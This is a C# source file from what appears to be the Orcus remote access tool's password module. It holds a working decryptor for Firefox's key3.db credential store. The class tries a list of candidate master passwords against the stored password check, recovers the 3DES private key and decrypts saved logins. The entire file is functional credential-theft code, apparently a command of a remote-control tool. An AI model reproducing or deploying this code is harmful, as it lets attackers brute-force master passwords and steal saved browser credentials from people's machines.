using System;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using Orcus.Commands.Passwords.Applications.Mozilla.Cryptography;
using Orcus.Shared.Utilities;

namespace Orcus.Commands.Passwords.Applications.Mozilla
{
    public class MozillaDecryptor
    {
        private byte[] _privateKey;

        public MozillaDecryptor()
        {
        }

        public MozillaDecryptor(string[] passwordList)
        {
            PasswordList = passwordList;
        }

        public string[] PasswordList { get; set; }

        public bool Initialize(string profilePath)
        {
            BerkeleyDb db = new BerkeleyDb(Path.Combine(profilePath, "key3.db"));
            PasswordCheck pwdCheck = new PasswordCheck(db.Keys.Where(p => p.Key.Equals("password-check"))
                .Select(p => p.Value).First().Replace("-", ""));

            string globalSalt = db.Keys.Where(p => p.Key.Equals("global-salt"))
                .Select(p => p.Value)
                .First()
                .Replace("-", "");

            var globalSaltBytes = StringExtensions.HexToBytes(globalSalt);
            var pwdCheckSaltBytes = StringExtensions.HexToBytes(pwdCheck.EntrySalt);

            var masterPassword = "";

            bool CheckPassword(string password)
            {
                MozillaPBE checkPwd = new MozillaPBE(globalSaltBytes, Encoding.ASCII.GetBytes(password),
                    pwdCheckSaltBytes);

                checkPwd.Compute();
                string decryptedPwdChk = TripleDesHelper.DescbcDecryptor(checkPwd.Key, checkPwd.IV,
                    StringExtensions.HexToBytes(pwdCheck.Passwordcheck));

                return decryptedPwdChk.StartsWith("password-check");
            }

            if (!CheckPassword(masterPassword))
            {
                var foundPassword = false;
                if (PasswordList?.Length > 0)
                    foreach (var password in PasswordList)
                    {
                        masterPassword = password;
                        foundPassword = CheckPassword(password);
                        if (foundPassword)
                            break;
                    }

                if (!foundPassword)
                    return false;
            }

            //private key
            string f81 = db.Keys.Where(p => !p.Key.Equals("global-salt")
                                            && !p.Key.Equals("Version")
                                            && !p.Key.Equals("password-check"))
                .Select(p => p.Value)
                .First()
                .Replace("-", "");

            Asn1DerObject f800001 = Asn1Der.Parse(StringExtensions.HexToBytes(f81));

            MozillaPBE checkPrivateKey = new MozillaPBE(StringExtensions.HexToBytes(globalSalt),
                Encoding.ASCII.GetBytes(masterPassword), f800001.Objects[0].Objects[0].Objects[1].Objects[0].Data);
            checkPrivateKey.Compute();

            byte[] decryptF800001 = TripleDesHelper.DescbcDecryptorByte(checkPrivateKey.Key, checkPrivateKey.IV,
                f800001.Objects[0].Objects[1].Data);

            Asn1DerObject f800001deriv1 = Asn1Der.Parse(decryptF800001);
            Asn1DerObject f800001deriv2 = Asn1Der.Parse(f800001deriv1.Objects[0].Objects[2].Data);

            if (f800001deriv2.Objects[0].Objects[3].Data.Length > 24)
            {
                _privateKey = new byte[24];
                Array.Copy(f800001deriv2.Objects[0].Objects[3].Data,
                    f800001deriv2.Objects[0].Objects[3].Data.Length - 24, _privateKey, 0, 24);
            }
            else
            {
                _privateKey = f800001deriv2.Objects[0].Objects[3].Data;
            }

            return true;
        }

        public string DecryptString(string encryptedString)
        {
            return DecryptData(Convert.FromBase64String(encryptedString));
        }

        public string DecryptData(byte[] data)
        {
            var asnObj = Asn1Der.Parse(data);
            return Regex.Replace(TripleDesHelper.DescbcDecryptor(_privateKey,
                    asnObj.Objects[0].Objects[1].Objects[1].Data, asnObj.Objects[0].Objects[2].Data),
                @"[^\u0020-\u007F]",
                "");
        }
    }
}